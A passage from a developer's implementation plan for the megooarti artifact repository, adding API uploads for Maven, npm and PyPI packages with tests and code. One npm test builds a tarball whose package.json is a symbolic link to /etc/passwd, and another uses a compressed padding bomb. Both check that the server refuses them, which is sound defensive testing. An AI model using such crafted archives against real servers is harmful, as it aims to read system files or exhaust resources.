    pom = generated_pom(group, artifact, version, packaging) if wanted else None
    return Plan(paths=tuple(targets), pom_path=pom_path, pom=pom)
```

In `backend/src/megooarti/repositories/maven/format.py`:

Replace

```python
from megooarti.repositories.content import RepositoryContext, TooLarge
from megooarti.repositories.formats import ComponentKey, Format, Serve, register
from megooarti.repositories.maven import checksums, metadata, paths
```

with

```python
from megooarti.repositories.content import RepositoryContext, TooLarge
from megooarti.repositories.formats import (
    ComponentKey,
    Format,
    Serve,
    invalid_upload,
    register,
)
from megooarti.repositories.forms import UploadForm
from megooarti.repositories.maven import checksums, metadata, paths, upload
```

After

```python
    def content_type(self, path: str, declared: str | None) -> str | None:
        # Maven clients rarely declare a type, and never a useful one.
        return paths.content_type(path) or declared
```

add

```python
    async def upload(self, context: RepositoryContext, form: UploadForm) -> list[str]:
        """Store an artifact's files where its coordinates say, as a deploy would.

        Checksums and metadata are generated from what is stored, so there is nothing
        to write for them. A POM is written when the version would have none.
        """
        sent = [(file.field, file.filename) for file in form.files]
        try:
            planned = upload.plan(form.fields, sent)
        except upload.InvalidUpload as error:
            raise invalid_upload(error.field, str(error)) from None
        settings = context.repository.config["format_config"]
        for path in planned.paths:
            refusal = _excluded(settings, paths.classify(path))
            if refusal is not None:
                raise refusal
        stored = []
        for path, file in zip(planned.paths, form.files, strict=True):
            await context.store(path, file.staged, content_type=self.content_type(path, None))
            stored.append(path)
        if planned.pom is not None and await context.stat(planned.pom_path) is None:
            written = await context.stage_bytes(planned.pom)
            await context.store(planned.pom_path, written, content_type=_XML)
            stored.append(planned.pom_path)
        return stored
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `uv run pytest tests/repositories/maven/test_upload.py tests/repositories/maven/test_content_upload.py -q`
Expected: 58 passed.

- [ ] **Step 5: Commit**

```bash
git add backend/src/megooarti/repositories/maven backend/tests/repositories/maven
git commit -m "feat(maven): upload an artifact through the API, with a POM written for it"
```

---

### Task 4: npm: a package tarball

**Files:**
- Create: `backend/src/megooarti/repositories/npm/tarballs.py`
- Modify: `backend/src/megooarti/repositories/npm/documents.py`
- Modify: `backend/src/megooarti/repositories/npm/format.py`
- Modify: `backend/tests/repositories/npm/conftest.py`
- Test: `backend/tests/repositories/npm/test_tarballs.py`
- Test: `backend/tests/repositories/npm/test_content_upload.py`

**Interfaces:**
- Consumes: `Format.upload`, `invalid_upload`, `only_fields`, `context.read_staged` (Tasks 1 and 2); `_publish`, `publishing`, `off_loop`, `documents.Upload`, `Release`, `is_valid_tag`.
- Produces:
  - `tarballs.manifest(data: bytes, *, scan_limit: int = SCAN_LIMIT) -> dict`: the `package.json` in the tarball's one folder. Raises `InvalidPackage`.
  - `documents.check_version(package, version, manifest) -> None`, which `read_upload` now calls; `documents.loads(raw, what="the body")`.
  - `NpmFormat.upload`.
  - For tests: `packed(members) -> bytes` and `package_tarball(package, version, **manifest) -> bytes` in the npm `conftest.py`.

- [ ] **Step 1: Write the failing tests**

In `backend/tests/repositories/npm/conftest.py`:

Replace

```python
import base64
import hashlib
import json
```

with

```python
import base64
import hashlib
import io
import json
import tarfile
```

Add to the end of `backend/tests/repositories/npm/conftest.py`:

```python
def packed(members: dict[str, dict | bytes | str]) -> bytes:
    """A real tarball, as `npm pack` writes one: gzip over tar.

    A member is JSON for a dict, a file for bytes, and for text `-> target` a symbolic link.
    """
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, content in members.items():
            member = tarfile.TarInfo(name)
            if isinstance(content, str):
                member.type, member.linkname = tarfile.SYMTYPE, content.removeprefix("-> ")
                archive.addfile(member)
                continue
            data = json.dumps(content).encode() if isinstance(content, dict) else content
            member.size = len(data)
            archive.addfile(member, io.BytesIO(data))
    return buffer.getvalue()


def package_tarball(package: str, version: str, **manifest) -> bytes:
    """The tarball of a small package, with its `package.json` saying what it is."""
    said = {"name": package, "version": version, **manifest}
    return packed({"package/package.json": said, "package/index.js": b"module.exports = 1;\n"})
```

`backend/tests/repositories/npm/test_tarballs.py`:

```python
"""Reading a package's manifest out of its tarball."""

import gzip
import json

import pytest

from megooarti.repositories.npm import documents, tarballs
from megooarti.repositories.npm.documents import InvalidPackage
from tests.repositories.npm.conftest import packed

TOOL = {"name": "tool", "version": "1.0.0", "description": "A tool"}


def test_the_manifest_is_the_package_json_in_the_tarballs_folder():
    data = packed({"package/package.json": TOOL, "package/index.js": b"module.exports = 1"})

    assert tarballs.manifest(data) == TOOL


@pytest.mark.parametrize(
    "name", ["package/package.json", "./package/package.json", "tool-1.0.0/package.json"]
)
def test_the_folder_may_have_any_name(name):
    assert tarballs.manifest(packed({name: TOOL})) == TOOL


def test_a_package_json_deeper_down_is_some_other_packages():
    data = packed(
        {
            "package/node_modules/dep/package.json": {"name": "dep", "version": "9.9.9"},
            "package/package.json": TOOL,
        }
    )
    without = packed({"package/lib/package.json": TOOL, "package.json": TOOL})

    assert tarballs.manifest(data) == TOOL
    with pytest.raises(InvalidPackage, match="has no package.json"):
        tarballs.manifest(without)


@pytest.mark.parametrize(
    "data",
    [
        b"",
        b"this is not a tarball at all",
        gzip.compress(b"compressed, and still not a tarball"),
        packed({"package/package.json": TOOL})[:-20],
        packed({"package/package.json": TOOL})[:60],
    ],
    ids=["empty", "text", "gzip-of-text", "cut-short", "cut-early"],
)
def test_what_is_not_a_tarball_is_refused(data):
    with pytest.raises(InvalidPackage, match="not a package tarball|has no package.json"):
        tarballs.manifest(data)


@pytest.mark.parametrize(
    ("content", "reason"),
    [
        (b"{not json", "its package.json is not JSON"),
        (b'["a", "list"]', "its package.json is not an object"),
        (b'{"name": "a\\u0000b"}', "NUL"),
        (json.dumps({"readme": "x" * documents.MAX_MANIFEST_BYTES}).encode(), "larger than 1 MiB"),
    ],
    ids=["broken", "list", "nul", "huge"],
)
def test_a_manifest_that_cannot_be_kept_is_refused(content, reason):
    with pytest.raises(InvalidPackage, match=reason):
        tarballs.manifest(packed({"package/package.json": content}))


def test_no_more_than_a_set_amount_is_unpacked_to_find_the_manifest():
    # A megabyte of zeros is a kilobyte to send, and whoever sends it can send a gigabyte.
    data = packed({"package/padding.bin": bytes(1024 * 1024), "package/package.json": TOOL})

    assert len(data) < 10_000
    assert tarballs.manifest(data) == TOOL
    with pytest.raises(InvalidPackage, match="not near the start"):
        tarballs.manifest(data, scan_limit=100_000)


def test_a_link_named_as_the_manifest_is_not_read():
    data = packed({"package/package.json": "-> /etc/passwd"})

    with pytest.raises(InvalidPackage, match="has no package.json"):
        tarballs.manifest(data)
```

`backend/tests/repositories/npm/test_content_upload.py`:

```python
"""Uploading to an npm repository through the content API leaves it as `npm publish` would."""

import base64
import hashlib

import pytest

from megooarti.repositories.npm import paths
from tests.accounts import error_code
from tests.repositories.npm.conftest import address, create, package_tarball, packed, publish

UPLOAD = "/api/v1/content/npm/upload"


async def send(client, root, data: bytes, *, to: str = UPLOAD, **fields):
    return await client.post(to, data=fields, files=[("file", ("package.tgz", data))], headers=root)


async def test_an_uploaded_tarball_is_a_published_version(client, registry, root):
    data = package_tarball("tool", "1.0.0", description="A tool", keywords=["handy"])

    response = await send(client, root, data)
    document = (await client.get(address("tool"), headers=root)).json()
    tarball = await client.get(
        f"/repository/npm/{paths.tarball_path('tool', '1.0.0')}", headers=root
    )

    assert response.status_code == 201, response.text
    stored = response.json()
    assert [file["path"] for file in stored["files"]] == ["tool/-/tool-1.0.0.tgz"]
    assert [(c["namespace"], c["name"], c["version"]) for c in stored["components"]] == [
        ("", "tool", "1.0.0")
    ]
    assert document["dist-tags"] == {"latest": "1.0.0"}
    version = document["versions"]["1.0.0"]
    assert (version["name"], version["description"]) == ("tool", "A tool")
    assert version["_id"] == "tool@1.0.0"
    assert version["dist"]["shasum"] == hashlib.sha1(data).hexdigest()
    assert version["dist"]["integrity"] == (
        "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()
    )
    assert version["dist"]["tarball"].endswith("/repository/npm/tool/-/tool-1.0.0.tgz")
    assert tarball.content == data


async def test_a_scoped_package_goes_under_its_scope(client, registry, root):
    response = await send(client, root, package_tarball("@acme/tool", "2.1.0"))
    document = (await client.get(address("@acme/tool"), headers=root)).json()

    assert response.status_code == 201, response.text
    assert response.json()["files"][0]["path"] == "@acme/tool/-/tool-2.1.0.tgz"
    component = response.json()["components"][0]
    assert (component["namespace"], component["name"]) == ("acme", "tool")
    assert list(document["versions"]) == ["2.1.0"]


async def test_versions_uploaded_and_published_are_one_package(client, registry, root):
    await publish(client, root, "tool", "1.0.0")

    response = await send(client, root, package_tarball("tool", "1.1.0"))
    document = (await client.get(address("tool"), headers=root)).json()

    assert response.status_code == 201, response.text
    assert list(document["versions"]) == ["1.0.0", "1.1.0"]
    assert document["dist-tags"] == {"latest": "1.1.0"}


async def test_a_tag_other_than_latest_can_be_given(client, registry, root):
    await send(client, root, package_tarball("tool", "1.0.0"))

    response = await send(client, root, package_tarball("tool", "2.0.0-beta.1"), tag="beta")
    document = (await client.get(address("tool"), headers=root)).json()

    assert response.status_code == 201, response.text
    assert document["dist-tags"] == {"latest": "1.0.0", "beta": "2.0.0-beta.1"}


async def test_uploading_a_version_again_follows_the_deployment_policy(client, db, root):
    await create(db, "once", hosted={"deployment_policy": "disable_redeploy"})
    to = "/api/v1/content/once/upload"
    first = await send(client, root, package_tarball("tool", "1.0.0"), to=to)

    again = await send(client, root, package_tarball("tool", "1.0.0", description="new"), to=to)
    document = (await client.get(address("tool", "once"), headers=root)).json()

    assert first.status_code == 201, first.text
    assert (again.status_code, error_code(again)) == (409, "redeploy_disabled")
    assert "description" not in document["versions"]["1.0.0"]


@pytest.mark.parametrize(
    ("data", "reason"),
    [
        (b"this is not a tarball", "not a package tarball"),
        (packed({"package/index.js": b"1"}), "no package.json"),
        (packed({"package/package.json": {"version": "1.0.0"}}), "does not name a package"),
        (packed({"package/package.json": {"name": "a b", "version": "1.0.0"}}), "does not name"),
        (packed({"package/package.json": {"name": "tool"}}), "no version"),
        (package_tarball("tool", "one"), "not a valid version"),
        (package_tarball("Tool", "1.0.0"), "lower case"),
        (package_tarball("tool", "1.0.0", private=True), "private"),
    ],
    ids=[
        "text",
        "no-manifest",
        "unnamed",
        "bad-name",
        "no-version",
        "bad-version",
        "case",
        "private",
    ],
)
async def test_what_is_not_a_package_to_publish_is_refused(client, registry, root, data, reason):
    response = await send(client, root, data)
    tree = await client.get("/api/v1/content/npm/tree", headers=root)

    assert (response.status_code, error_code(response)) == (400, "invalid_package")
    assert reason in response.json()["error"]["message"]
    assert tree.json()["items"] == []


async def test_a_form_needs_one_tarball_and_nothing_it_does_not_know(client, registry, root):
    tarball = ("package.tgz", package_tarball("tool", "1.0.0"))
    none = await client.post(UPLOAD, data={"tag": "latest"}, files=[], headers=root)
    two = await client.post(UPLOAD, files=[("file", tarball), ("file", tarball)], headers=root)
    other = await client.post(UPLOAD, files=[("tarball", tarball)], headers=root)
    tagged = await send(client, root, tarball[1], tag="a/b")
    misspelt = await send(client, root, tarball[1], tga="beta")

    for response in (none, two, other, tagged, misspelt):
        assert (response.status_code, error_code(response)) == (422, "validation_error")
    fields = [r.json()["error"]["details"][0]["field"] for r in (two, other, tagged, misspelt)]
    assert fields == ["file", "file", "tag", "tga"]


async def test_a_tarball_larger_than_a_publish_may_be_is_refused(client, registry, root, app):
    app.state.settings.npm_max_publish_bytes = 200
    data = package_tarball("tool", "1.0.0", readme="x" * 5000, noise=list(range(500)))

    response = await send(client, root, data)

    assert len(data) > 200
    assert (response.status_code, error_code(response)) == (413, "payload_too_large")
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/repositories/npm/test_tarballs.py tests/repositories/npm/test_content_upload.py -q`
Expected: collection error, `cannot import name 'tarballs' from 'megooarti.repositories.npm'`.

- [ ] **Step 3: Implement**

`backend/src/megooarti/repositories/npm/tarballs.py`:

```python
"""Reading a package's own manifest out of its tarball.

`npm publish` reads `package.json` and sends it beside the tarball. An upload through
the API sends the tarball alone, so the manifest is read out of it here. Pure functions:
nothing is unpacked to a disk, and no more than a bounded amount is ever decompressed.
"""

import gzip
import io
import tarfile
import zlib
from typing import Any

from megooarti.repositories.npm import documents
from megooarti.repositories.npm.documents import InvalidPackage

MANIFEST = "package.json"
# The most that is decompressed looking for the manifest. `npm pack` writes it first;
# a tarball that hides it behind more than this is not one to spend longer on.
SCAN_LIMIT = 256 * 1024 * 1024
_PIECE = 64 * 1024


class _Bounded:
    """A stream that refuses to give more than a set amount."""

    def __init__(self, source: Any, most: int) -> None:
        self._source, self._left = source, most

    def read(self, size: int = -1) -> bytes:
        data = self._source.read(size if 0 < size <= _PIECE else _PIECE)
        self._left -= len(data)
        if self._left < 0:
            raise InvalidPackage("its package.json is not near the start of the tarball")
        return data


def _is_manifest(name: str) -> bool:
    """Whether a member is `package.json` in the tarball's one folder, as npm reads it."""
    parts = name.removeprefix("./").split("/")
    return len(parts) == 2 and parts[1] == MANIFEST


def manifest(data: bytes, *, scan_limit: int = SCAN_LIMIT) -> dict[str, Any]:
    """The `package.json` of a package tarball. Raises InvalidPackage."""
    try:
        unpacked = _Bounded(gzip.GzipFile(fileobj=io.BytesIO(data)), scan_limit)
        with tarfile.open(fileobj=unpacked, mode="r|") as archive:  # read in one pass
            for member in archive:
                if not member.isfile() or not _is_manifest(member.name):
                    continue
                if member.size > documents.MAX_MANIFEST_BYTES:
                    raise InvalidPackage("its package.json is larger than 1 MiB")
                held = archive.extractfile(member)
                found = documents.loads(b"" if held is None else held.read(), "its package.json")
                if not isinstance(found, dict):
                    raise InvalidPackage("its package.json is not an object")
                return found
    except (tarfile.TarError, OSError, EOFError, zlib.error):
        raise InvalidPackage("the file is not a package tarball") from None
    raise InvalidPackage("the tarball has no package.json")
```

In `backend/src/megooarti/repositories/npm/documents.py`:

Replace

```python
def loads(raw: bytes) -> Any:
    """Parse JSON a client sent, refusing what could not be stored. Raises InvalidPackage."""
    try:
        value = json.loads(raw, parse_constant=_refuse_constant, parse_float=_finite)
    except (ValueError, RecursionError):  # UnicodeDecodeError is a ValueError
        raise InvalidPackage("the body is not JSON") from None
```

with

```python
def loads(raw: bytes, what: str = "the body") -> Any:
    """Parse JSON a client sent, refusing what could not be stored. Raises InvalidPackage."""
    try:
        value = json.loads(raw, parse_constant=_refuse_constant, parse_float=_finite)
    except (ValueError, RecursionError):  # UnicodeDecodeError is a ValueError
        raise InvalidPackage(f"{what} is not JSON") from None
```

Before

```python
def read_upload(package: str, raw: bytes) -> Upload:
```

add

```python
def check_version(package: str, version: str, manifest: Any) -> None:
    """Check one version a publish carries, by its manifest. Raises InvalidPackage."""
    if not semver.is_valid(version):
        raise InvalidPackage(f"{version!r} is not a valid version")
    if not isinstance(manifest, dict):
        raise InvalidPackage(f"the manifest of version {version} is not an object")
    if manifest.get("name") != package or manifest.get("version") != version:
        raise InvalidPackage(f"the manifest of version {version} names something else")
    if len(dumps(manifest)) > MAX_MANIFEST_BYTES:
        raise InvalidPackage(f"the manifest of version {version} is larger than 1 MiB")
```

Replace

```python
    for version, manifest in versions.items():
        if not semver.is_valid(version):
            raise InvalidPackage(f"{version!r} is not a valid version")
        if not isinstance(manifest, dict):
            raise InvalidPackage(f"the manifest of version {version} is not an object")
        if manifest.get("name") != package or manifest.get("version") != version:
            raise InvalidPackage(f"the manifest of version {version} names something else")
        if len(dumps(manifest)) > MAX_MANIFEST_BYTES:
            raise InvalidPackage(f"the manifest of version {version} is larger than 1 MiB")
        data = _attachment(attachments, package, version)
```

with

```python
    for version, manifest in versions.items():
        check_version(package, version, manifest)
        data = _attachment(attachments, package, version)
```

In `backend/src/megooarti/repositories/npm/format.py`:

Replace

```python
from megooarti.repositories.formats import (
    ComponentKey,
    Format,
    Serve,
    managed_by_format,
    register,
)
from megooarti.repositories.npm import documents, paths, semver
```

with

```python
from megooarti.repositories.formats import (
    ComponentKey,
    Format,
    Serve,
    invalid_upload,
    managed_by_format,
    only_fields,
    register,
)
from megooarti.repositories.forms import UploadForm
from megooarti.repositories.npm import documents, paths, semver, tarballs
```

Before

```python
async def _update(
    context: RepositoryContext, request: Request, package: str, upload: documents.Upload
) -> Response:
```

add

```python
def _packed(data: bytes) -> tuple[str, documents.Release]:
    """A tarball as the one version it is, by its own `package.json`. Raises InvalidPackage."""
    manifest = tarballs.manifest(data)
    package, version = manifest.get("name"), manifest.get("version")
    if not isinstance(package, str) or not paths.is_valid_name(package):
        raise documents.InvalidPackage("its package.json does not name a package")
    if not isinstance(version, str):
        raise documents.InvalidPackage("its package.json has no version")
    if manifest.get("private") is True:
        # `npm publish` refuses it too: it is how a package says it must stay where it is.
        raise documents.InvalidPackage("its package.json says the package is private")
    manifest.setdefault("_id", f"{package}@{version}")  # as `npm publish` adds it
    documents.check_version(package, version, manifest)
    return package, documents.Release(version=version, manifest=manifest, data=data)
```

After

```python
class NpmFormat(Format):
    name = "npm"
```

add

```python
    async def upload(self, context: RepositoryContext, form: UploadForm) -> list[str]:
        """Publish a package tarball as `npm publish` would. Its `package.json` says what it is."""
        only_fields(form, ("tag",))
        if len(form.files) != 1 or form.files[0].field != "file":
            raise invalid_upload("file", "One package tarball is needed, sent as `file`.")
        tag = form.fields.get("tag", "").strip() or "latest"
        if not documents.is_valid_tag(tag):
            raise invalid_upload("tag", "This is not a dist-tag.")
        async with publishing():
            data = await context.read_staged(
                form.files[0].staged, limit=context.settings.npm_max_publish_bytes
            )
            if data is None:
                raise ApiError(
                    413, "payload_too_large", "The package is larger than this server takes."
                )
            try:
                package, release = await off_loop(_packed, data)
            except documents.InvalidPackage as error:
                raise _invalid(error) from None
            sent = documents.Upload(document={}, releases=(release,), tags={tag: release.version})
            await _publish(context, package, sent)
        return [paths.tarball_path(package, release.version)]
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `uv run pytest tests/repositories/npm/test_tarballs.py tests/repositories/npm/test_content_upload.py tests/repositories/npm/test_documents.py tests/repositories/npm/test_hosted_publish.py -q`
Expected: 130 passed. The last two files show that a publish is read as before.

- [ ] **Step 5: Commit**

```bash
git add backend/src/megooarti/repositories/npm backend/tests/repositories/npm
git commit -m "feat(npm): upload a package tarball through the API"
```

---

### Task 5: PyPI: wheels and source distributions

**Files:**
- Modify: `backend/src/megooarti/repositories/pypi/names.py`
- Modify: `backend/src/megooarti/repositories/pypi/format.py`
- Test: `backend/tests/repositories/pypi/test_names.py`
- Test: `backend/tests/repositories/pypi/test_content_upload.py`

**Interfaces:**
- Consumes: `Format.upload`, `invalid_upload`, `only_fields` (Tasks 1 and 2); `upload.declared`, `Declared`; `names.UPLOADABLE`.
- Produces:
  - `names.named(filename) -> tuple[str, str] | None`: the project as written, and the version.
  - `await _keep(context, sent: upload.Declared, staged) -> str`: the storing half of `_upload`, shared with the hook.
  - `PypiFormat.upload`.

- [ ] **Step 1: Write the failing tests**

Add to the end of `backend/tests/repositories/pypi/test_names.py`:

```python
@pytest.mark.parametrize(
    ("filename", "named"),
    [
        ("greeter-1.0-py3-none-any.whl", ("greeter", "1.0")),
        ("My_Package-2.0.post1-7-cp313-cp313-win_amd64.whl", ("My_Package", "2.0.post1")),
        ("greeter-1.0.tar.gz", ("greeter", "1.0")),
        ("my-package-1.0rc1.tar.gz", ("my-package", "1.0rc1")),
        ("my_package-2!1.0+local.zip", ("my_package", "2!1.0+local")),
        ("greeter.tar.gz", None),
        ("-1.0.tar.gz", None),
        ("greeter-.tar.gz", None),
        ("greeter-1.0-py3-none.whl", None),
        ("greeter-1.0.tar.bz2", None),
        ("greeter-1.0.egg", None),
        ("notes.txt", None),
        ("", None),
    ],
)
def test_a_files_name_says_its_project_and_version(filename, named):
    assert names.named(filename) == named
```

`backend/tests/repositories/pypi/test_content_upload.py`:

```python
"""Uploading to a PyPI repository through the content API leaves it as twine would."""

import hashlib

import pytest

from tests.accounts import error_code
from tests.repositories.pypi.conftest import content_of, create, links, upload

UPLOAD = "/api/v1/content/pypi/upload"
WHEEL = "greeter-1.0-py3-none-any.whl"
SDIST = "greeter-1.0.tar.gz"


def parts(*filenames: str, field: str = "file") -> list:
    return [(field, (filename, content_of(filename))) for filename in filenames]


async def send(client, root, *filenames: str, to: str = UPLOAD, **fields):
    return await client.post(to, data=fields, files=parts(*filenames), headers=root)


async def test_uploaded_files_are_on_their_projects_page(client, index, root):
    response = await send(client, root, WHEEL, SDIST)
    page = await client.get("/repository/pypi/simple/greeter/", headers=root)
    wheel = await client.get(f"/repository/pypi/packages/greeter/1.0/{WHEEL}", headers=root)

    assert response.status_code == 201, response.text
    stored = response.json()
    assert [file["path"] for file in stored["files"]] == [
        f"packages/greeter/1.0/{WHEEL}",
        f"packages/greeter/1.0/{SDIST}",
    ]
    assert [(c["namespace"], c["name"], c["version"]) for c in stored["components"]] == [
        ("", "greeter", "1.0")
    ]
    digest = hashlib.sha256(content_of(WHEEL)).hexdigest()
    assert [text for _, text in links(page)] == [WHEEL, SDIST]
    assert f"{WHEEL}#sha256={digest}" in page.text
    assert wheel.content == content_of(WHEEL)


async def test_a_project_is_kept_under_the_normal_form_of_its_name(client, index, root):
    response = await send(client, root, "My_Package-2.0-py3-none-any.whl", "my-package-2.0.zip")
    page = await client.get("/repository/pypi/simple/my-package/", headers=root)

    assert response.status_code == 201, response.text
    assert [file["path"] for file in response.json()["files"]] == [
        "packages/my-package/2.0/My_Package-2.0-py3-none-any.whl",
        "packages/my-package/2.0/my-package-2.0.zip",
    ]
    assert len(links(page)) == 2


async def test_what_the_form_says_of_the_files_is_kept_with_them(client, index, root):
    response = await send(
        client,
        root,
        WHEEL,
        summary="Says hello politely",
        requires_python=">=3.9",
        keywords="salutation,manners",
    )
    page = await client.get("/repository/pypi/simple/greeter/", headers=root)
    found = await client.get("/api/v1/search", params={"q": "politely manners"}, headers=root)

    assert response.status_code == 201, response.text
    assert links(page)[0][0]["data-requires-python"] == ">=3.9"
    assert [item["name"] for item in found.json()["items"]] == ["greeter"]


async def test_files_of_several_projects_can_come_together(client, index, root):
    response = await send(client, root, WHEEL, "other-0.3-py3-none-any.whl")

    assert response.status_code == 201, response.text
    assert sorted(found["name"] for found in response.json()["components"]) == ["greeter", "other"]


async def test_uploaded_and_twine_sent_files_are_one_project(client, index, root):
    assert (await upload(client, root, WHEEL)).status_code == 200

    response = await send(client, root, SDIST)
    page = await client.get("/repository/pypi/simple/greeter/", headers=root)

    assert response.status_code == 201, response.text
    assert [text for _, text in links(page)] == [WHEEL, SDIST]


@pytest.mark.parametrize(
    "filename",
    [
        "notes.txt",
        "greeter.tar.gz",
        "greeter-1.0.tar.bz2",
        "-1.0.tar.gz",
        "greeter-1.0-py3-none.whl",
        "gr$$ter-1.0.tar.gz",
        "greeter-1.0.egg",
    ],
)
async def test_a_file_whose_name_does_not_say_what_it_is_is_refused(client, index, root, filename):
    response = await send(client, root, WHEEL, filename)
    tree = await client.get("/api/v1/content/pypi/tree", headers=root)

    assert (response.status_code, error_code(response)) == (400, "invalid_package")
    assert filename in response.json()["error"]["message"]
    assert tree.json()["items"] == []  # the wheel that came with it did not stay


async def test_a_form_needs_files_and_nothing_it_does_not_know(client, index, root):
    two = await send(client, root, WHEEL, WHEEL)
    other = await client.post(UPLOAD, files=parts(WHEEL, field="content"), headers=root)
    misspelt = await send(client, root, WHEEL, sumary="Says hello")
    named = await send(client, root, WHEEL, name="greeter")

    for response in (two, other, misspelt, named):
        assert (response.status_code, error_code(response)) == (422, "validation_error")
    fields = [r.json()["error"]["details"][0]["field"] for r in (two, other, misspelt, named)]
    assert fields == ["file", "content", "sumary", "name"]


async def test_what_the_form_says_must_be_fit_to_keep(client, index, root):
    response = await send(client, root, WHEEL, requires_python=">=3.9\x07")

    assert (response.status_code, error_code(response)) == (400, "invalid_package")


async def test_an_upload_is_all_or_nothing_where_nothing_is_replaced(client, db, root):
    await create(db, "once", hosted={"deployment_policy": "disable_redeploy"})
    to = "/api/v1/content/once/upload"
    first = await send(client, root, WHEEL, to=to)

    again = await send(client, root, SDIST, WHEEL, to=to)
    page = await client.get("/repository/once/simple/greeter/", headers=root)

    assert first.status_code == 201, first.text
    assert (again.status_code, error_code(again)) == (409, "redeploy_disabled")
    assert [text for _, text in links(page)] == [WHEEL]
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/repositories/pypi/test_names.py tests/repositories/pypi/test_content_upload.py tests/repositories/pypi/test_hosted.py -q`
Expected: 27 failed, 137 passed. `module 'megooarti.repositories.pypi.names' has no attribute 'named'`, and every upload is refused for its fields: the generic format knows only `directory`.

- [ ] **Step 3: Implement**

In `backend/src/megooarti/repositories/pypi/names.py`:

Before

```python
def classify(path: str) -> PypiPath:
    """What a request path is. One trailing slash is ignored, and remembered."""
```

add

```python
def named(filename: str) -> tuple[str, str] | None:
    """The project, as it is written, and the version that a file's name gives.

    For a file that comes with nothing said about it. A wheel's name has five or six
    parts, of which these are the first two. A source distribution's is the project,
    a hyphen and the version, and a version has no hyphen in it (PEP 625), so the last
    one divides them. None for a name that is neither, or is not one that is uploaded.
    """
    if filename.endswith(".whl"):
        parts = filename[: -len(".whl")].split("-")
        return (parts[0], parts[1]) if len(parts) in (5, 6) else None
    extension = next((known for known in UPLOADABLE if filename.endswith(known)), None)
    if extension is None:
        return None
    name, hyphen, version = filename[: -len(extension)].rpartition("-")
    return (name, version) if hyphen and name and version else None
```

In `backend/src/megooarti/repositories/pypi/format.py`:

Replace

```python
from megooarti.repositories.formats import ComponentKey, Format, Serve, register
from megooarti.repositories.pypi import names, pages, upload
```

with

```python
from megooarti.repositories.formats import (
    ComponentKey,
    Format,
    Serve,
    invalid_upload,
    only_fields,
    register,
)
from megooarti.repositories.forms import UploadForm
from megooarti.repositories.pypi import names, pages, upload
from megooarti.storage.backends import StagedBlob
```

Replace

```python
    wrong = [name for name, digest in sent.digests.items() if getattr(staged, name) != digest]
    if wrong:
        await context.discard(staged)
        raise ApiError(400, "checksum_mismatch", f"The {wrong[0]} digest does not match the file.")

    release = {"name": sent.name, "version": sent.version, "summary": sent.summary}
    if sent.keywords:
        release["keywords"] = sent.keywords
    # The facade checks `add` or `edit` and the deployment policy, under the path's lock.
    # The path has the version in the file's name, not the one declared: a file name
    # then has one address in its project, and declaring another version cannot put a
    # second file of that name beside the first.
    await context.store(
        names.file_path(sent.project, sent.file_version, sent.filename),
        staged,
        content_type=_FILE,
        # A page says what each file requires, so that is kept with the file.
        attributes={_DECLARED: {"requires_python": sent.requires_python}},
        component_attributes={_DECLARED: release},
    )
    return Response(status_code=200, headers=_PROTECTIVE)
```

with

```python
    wrong = [name for name, digest in sent.digests.items() if getattr(staged, name) != digest]
    if wrong:
        await context.discard(staged)
        raise ApiError(400, "checksum_mismatch", f"The {wrong[0]} digest does not match the file.")
    await _keep(context, sent, staged)
    return Response(status_code=200, headers=_PROTECTIVE)


async def _keep(context: RepositoryContext, sent: upload.Declared, staged: StagedBlob) -> str:
    """Store a file with what was said about it. Returns where it is."""
    release = {"name": sent.name, "version": sent.version, "summary": sent.summary}
    if sent.keywords:
        release["keywords"] = sent.keywords
    # The path has the version in the file's name, not the one declared: a file name
    # then has one address in its project, and declaring another version cannot put a
    # second file of that name beside the first.
    path = names.file_path(sent.project, sent.file_version, sent.filename)
    # The facade checks `add` or `edit` and the deployment policy, under the path's lock.
    await context.store(
        path,
        staged,
        content_type=_FILE,
        # A page says what each file requires, so that is kept with the file.
        attributes={_DECLARED: {"requires_python": sent.requires_python}},
        component_attributes={_DECLARED: release},
    )
    return path
```

Before

```python
    def describe_component(self, path: str) -> ComponentKey | None:
        """A file belongs to its project and version. Nothing else is part of one."""
```

add

```python
    async def upload(self, context: RepositoryContext, form: UploadForm) -> list[str]:
        """Store wheels and source distributions as an upload by twine would.

        twine says which project and version a file is of. Here the file's name does,
        and what the form says besides is said of every file in it.
        """
        only_fields(form, ("summary", "requires_python", "keywords"))
        if not form.files:
            raise invalid_upload("file", "At least one wheel or source distribution is needed.")
        declared: list[upload.Declared] = []
        for file in form.files:
            if file.field != "file":
                raise invalid_upload(file.field, "A file is sent as `file`.")
            named = names.named(file.filename)
            if named is None:
                raise _invalid(
                    f"the name {file.filename} is not a wheel's or a source distribution's"
                )
            said = {**form.fields, ":action": "file_upload", "name": named[0], "version": named[1]}
            try:
                sent = upload.declared(said, file.filename, 1)
            except upload.InvalidUpload as error:
                raise _invalid(f"{file.filename}: {error}") from None
            if any(sent.filename == other.filename for other in declared):
                raise invalid_upload("file", f"Two files are named {file.filename}.")
            declared.append(sent)
        return [
            await _keep(context, sent, file.staged)
            for sent, file in zip(declared, form.files, strict=True)
        ]
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `uv run pytest tests/repositories/pypi/test_names.py tests/repositories/pypi/test_content_upload.py tests/repositories/pypi/test_hosted.py -q`
Expected: 164 passed. `test_hosted.py` shows that twine's upload is stored as before.

- [ ] **Step 5: Commit**

```bash
git add backend/src/megooarti/repositories/pypi backend/tests/repositories/pypi
git commit -m "feat(pypi): upload wheels and source distributions through the API"
```

---

### Task 6: How to use a component

**Files:**
- Modify: `backend/src/megooarti/repositories/formats.py`
- Modify: `backend/src/megooarti/repositories/content_api.py`
- Modify: `backend/src/megooarti/repositories/maven/format.py`
- Modify: `backend/src/megooarti/repositories/npm/format.py`
- Modify: `backend/src/megooarti/repositories/pypi/format.py`
- Modify: `backend/src/megooarti/repositories/docker/format.py`
- Test: `backend/tests/repositories/test_usage.py`

**Interfaces:**
- Consumes: `ComponentKey`; `browse.component`; the upload route, to put something there (Tasks 2 to 4).
- Produces:
  - `formats.Usage(label: str, language: str, text: str)`; `formats.plain(*parts: str) -> bool`.
